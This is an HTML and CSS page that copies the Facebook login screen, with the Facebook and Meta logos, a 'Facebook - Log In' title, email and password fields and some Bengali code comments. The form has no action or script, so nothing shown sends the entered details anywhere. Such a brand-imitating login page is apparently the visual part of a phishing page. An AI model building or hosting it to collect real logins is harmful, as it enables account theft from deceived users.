<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body {
            font-family: 'Helvetica Neue', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, rgba(242, 246, 255, 1) 0%, rgba(231, 245, 255, 1) 100%);
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            box-sizing: border-box;
        }

        .logo-container {
            margin-bottom: 15px;
        }

        .logo {
            width: 80px; /* লোগোর সাইজ */
        }

        .container {
            width: 100%;
            max-width: 380px;
            background: #ffffff;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            padding: 30px;
            box-sizing: border-box;
            text-align: center;
            margin-top: 20px; /* লোগো থেকে একটু নিচে */
        }

        .input-field {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s;
        }

        .login-btn:hover {
            background-color: #155db2;
        }

        .forgot-password {
            display: block;
            margin-top: 15px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }

        .create-account-btn {
            margin-top: 20px;
            padding: 10px 0;
            width: 100%;
            border: 1px solid #1877f2;
            color: #1877f2;
            border-radius: 6px;
            background-color: transparent;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .create-account-btn:hover {
            background-color: #e7f3ff;
        }

        .meta-logo-container {
            margin-top: 30px;
            text-align: center;
        }

        .meta-logo {
            width: 90px; /* Meta লোগোর সাইজ */
        }
    </style>
</head>
<body>
    <!-- Facebook Logo -->
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="logo" alt="Facebook Logo">
    </div>

    <!-- Login Form -->
    <div class="container">
        <form id="loginForm">
            <input type="text" id="emailOrPhone" class="input-field" placeholder="Mobile number or email address" required>
            <input type="password" id="password" class="input-field" placeholder="Password" required>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <a href="#" class="forgot-password">Forgotten Password?</a>
        <button class="create-account-btn">Create new account</button>
    </div>

    <!-- Meta Logo -->
    <div class="meta-logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Meta-Logo.png/1200px-Meta-Logo.png" class="meta-logo" alt="Meta Logo">
    </div>
</body>
</html>
